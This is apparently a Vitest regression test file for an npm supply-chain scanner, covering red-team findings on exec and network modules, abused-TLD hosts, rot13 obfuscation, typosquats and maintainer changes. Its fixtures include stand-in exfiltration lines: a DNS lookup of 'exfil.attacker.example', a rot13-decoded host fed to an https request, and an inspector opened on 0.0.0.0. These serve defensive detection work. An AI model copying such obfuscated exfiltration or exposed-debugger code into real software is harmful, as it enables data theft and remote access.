/**
 * Regression tests for the tail of red-team exploits: C3, C5, D6, L11, L4,
 * N2, N3, S6.
 *
 * @security-critical
 *
 * Reference: docs/REDTEAM-2026-07-12.md.
 */

import { describe, it, expect } from 'vitest';
import { extractCapabilities } from '../src/capabilities.js';
import { parseLockfile } from '../src/lockfile.js';

function cap(source: string) {
  return extractCapabilities('test.js', source, 'sha256-fake', source.length);
}

describe('REDTEAM N2: inspector / async_hooks / trace_events are exec-tier', () => {
  it('records inspector as an exec module', () => {
    const c = cap(`require('inspector').open(9229, '0.0.0.0', false);`);
    expect(c.execModules).toContain('inspector');
  });

  it('records async_hooks as an exec module', () => {
    const c = cap(`require('async_hooks').createHook({}).enable();`);
    expect(c.execModules).toContain('async_hooks');
  });

  it('records trace_events as an exec module', () => {
    const c = cap(`require('trace_events').createTracing({categories:['node']}).enable();`);
    expect(c.execModules).toContain('trace_events');
  });

  it('records the node: prefixed forms too', () => {
    const c = cap(`
      require('node:inspector');
      require('node:async_hooks');
      require('node:trace_events');
    `);
    expect(c.execModules).toContain('node:inspector');
    expect(c.execModules).toContain('node:async_hooks');
    expect(c.execModules).toContain('node:trace_events');
  });
});

describe('REDTEAM N3: dns module is a network channel', () => {
  it('records dns as a network module', () => {
    const c = cap(`require('dns').lookup('exfil.attacker.example', () => {});`);
    expect(c.networkModules).toContain('dns');
  });

  it('records dns/promises and node:dns variants', () => {
    const c = cap(`
      require('dns/promises');
      require('node:dns');
      require('node:dns/promises');
    `);
    expect(c.networkModules).toContain('dns/promises');
    expect(c.networkModules).toContain('node:dns');
    expect(c.networkModules).toContain('node:dns/promises');
  });
});

describe('REDTEAM L4: URL_REGEX broadened to catch bare hosts on abused TLDs', () => {
  const ABUSED_TLDS = ['top', 'pw', 'zip', 'click', 'info', 'us', 'biz',
    'mobi', 'icu', 'host', 'online', 'club', 'cloud', 'site', 'work',
    'stream', 'party', 'science', 'today', 'link'];

  for (const tld of ABUSED_TLDS) {
    it(`catches bare host on .${tld}`, () => {
      const c = cap(`const host = 'exfil.malicious.${tld}';`);
      const combined = [...c.urlLiterals, ...c.encodedUrls.map((e) => e.url)];
      const hit = combined.some((u) => u.includes(`.malicious.${tld}`));
      expect(hit, `Expected bare .${tld} host to be caught but urlLiterals=${JSON.stringify(c.urlLiterals)}`).toBe(true);
    });
  }

  it('also catches RFC-2606 reserved TLDs (.example / .test / .localhost) as suspect', () => {
    const c = cap(`const host = 'exfil.attacker.example';`);
    const combined = [...c.urlLiterals, ...c.encodedUrls.map((e) => e.url)];
    expect(combined.some((u) => u.includes('.attacker.example'))).toBe(true);
  });
});

describe('REDTEAM L11: rot13 / char-arithmetic decoder shape flagged', () => {
  it('records some signal for the rot13-encoded URL fixture', () => {
    const source = `
      'use strict';
      function rot13(s) {
        return s.replace(/[A-Za-z]/g, c => {
          const base = c >= 'a' ? 97 : 65;
          return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
        });
      }
      const enc = 'rksvy.rknzcyr.vainyvq';
      const host = rot13(enc);
      require('https').request({hostname: host, path: '/x'});
    `;
    const c = cap(source);
    const hasSignal =
      c.dynamicCode.some((d) => d.kind === 'char-arithmetic-decoder') ||
      c.suspiciousLiterals.some((s) => s.preview.startsWith('rksvy'));
    expect(hasSignal, 'Expected either a char-arithmetic-decoder dynamicCode entry or a suspiciousLiteral for the encoded string').toBe(true);
  });
});

describe('REDTEAM D6: TOP_NPM_NAMES expanded to cover critical popular targets', () => {
  it('detects openia as a typosquat of openai (distance 1)', async () => {
    const { closestTop } = await import('../../detectors/src/typo.js');
    const near = closestTop('openia');
    expect(near, 'openia should be flagged as typosquat of openai').not.toBeNull();
    expect(near!.target).toBe('openai');
    expect(near!.distance).toBeLessThanOrEqual(2);
  });

  it('detects nodemaler as a typosquat of nodemailer', async () => {
    const { closestTop } = await import('../../detectors/src/typo.js');
    const near = closestTop('nodemaler');
    expect(near).not.toBeNull();
    expect(near!.target).toBe('nodemailer');
  });

  it('detects strippe as a typosquat of stripe', async () => {
    const { closestTop } = await import('../../detectors/src/typo.js');
    const near = closestTop('strippe');
    expect(near).not.toBeNull();
    expect(near!.target).toBe('stripe');
  });

  it('detects firebaze as a typosquat of firebase', async () => {
    const { closestTop } = await import('../../detectors/src/typo.js');
    const near = closestTop('firebaze');
    expect(near).not.toBeNull();
    expect(near!.target).toBe('firebase');
  });
});

describe('REDTEAM C5: package-name case-normalization', () => {
  it('parseLockfile normalizes uppercase names to lowercase', () => {
    const lock = {
      name: 'target', version: '1.0.0', lockfileVersion: 3,
      packages: {
        '': { name: 'target', version: '1.0.0', dependencies: { 'Lodash': '4.17.21' } },
        'node_modules/Lodash': {
          name: 'Lodash', version: '4.17.21',
          integrity: 'sha512-fake', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
        },
      },
    };
    const g = parseLockfile(lock);
    const nodes = [...g.nodes.values()].filter((n) => n.name.toLowerCase() === 'lodash');
    expect(nodes.length).toBeGreaterThan(0);
    expect(nodes[0]!.name).toBe('lodash');
  });
});

describe('REDTEAM S6: meta detector fires even when newEmails is empty (dropped-maintainer signal)', () => {
  it('emits meta.maintainer-change when new manifest drops all maintainers', async () => {
    const { maintainerDetector } = await import('../../detectors/src/meta.js');
    const { SNAPSHOT_FORMAT_VERSION } = await import('../src/cache.js');
    const mkSnap = (over: { manifest: Record<string, unknown>; name: string; version: string }) => ({
      ...over,
      integrity: `sha512-${over.name}@${over.version}=`,
      files: [],
      nativeArtifacts: [],
      formatVersion: SNAPSHOT_FORMAT_VERSION,
      builtAt: '2026-07-12T00:00:00.000Z',
    });
    const pair = {
      old: mkSnap({
        name: 'chalk', version: '5.3.0',
        manifest: {
          name: 'chalk', version: '5.3.0',
          maintainers: [{ email: 'sindresorhus@example.com' }, { email: 'qix-@example.com' }],
        },
      }),
      new: mkSnap({
        name: 'chalk', version: '5.3.1',
        manifest: {
          name: 'chalk', version: '5.3.1',
        },
      }),
    };
    const findings = maintainerDetector.run(pair, { direction: 'changed' });
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0]!.detector).toBe('meta.maintainer-change');
    expect(findings[0]!.severity).toBe('BLOCK');
  });

  it('does NOT fire when both sides have zero maintainers (nothing changed)', async () => {
    const { maintainerDetector } = await import('../../detectors/src/meta.js');
    const { SNAPSHOT_FORMAT_VERSION } = await import('../src/cache.js');
    const mkSnap = (over: { name: string; version: string; manifest: Record<string, unknown> }) => ({
      ...over,
      integrity: '',
      files: [], nativeArtifacts: [],
      formatVersion: SNAPSHOT_FORMAT_VERSION,
      builtAt: '2026-07-12T00:00:00.000Z',
    });
    const pair = {
      old: mkSnap({ name: 'x', version: '1.0.0', manifest: { name: 'x', version: '1.0.0' } }),
      new: mkSnap({ name: 'x', version: '1.0.1', manifest: { name: 'x', version: '1.0.1' } }),
    };
    const findings = maintainerDetector.run(pair, { direction: 'changed' });
    expect(findings).toHaveLength(0);
  });
});

describe('REDTEAM C3: advisory version-adjacency signal', () => {
  it('flags versions just outside a known-vulnerable range', async () => {
    const { advisoriesForVersion } = await import('../../detectors/src/advisories.js');
    const matches = advisoriesForVersion('@solana/web3.js', '1.95.8');
    let adjacent: unknown = null;
    try {
      const mod = await import('../../detectors/src/advisories.js') as {
        adjacentAdvisories?: (name: string, version: string) => unknown[];
      };
      adjacent = mod.adjacentAdvisories?.('@solana/web3.js', '1.95.8');
    } catch { /* function may not exist yet */ }
    const hasSignal = matches.length > 0 || (Array.isArray(adjacent) && adjacent.length > 0);
    expect(hasSignal,
      'Expected either advisoriesForVersion or adjacentAdvisories to flag @solana/web3.js@1.95.8 as adjacent to GHSA-jj35-jhw9-vp4q',
    ).toBe(true);
  });
});
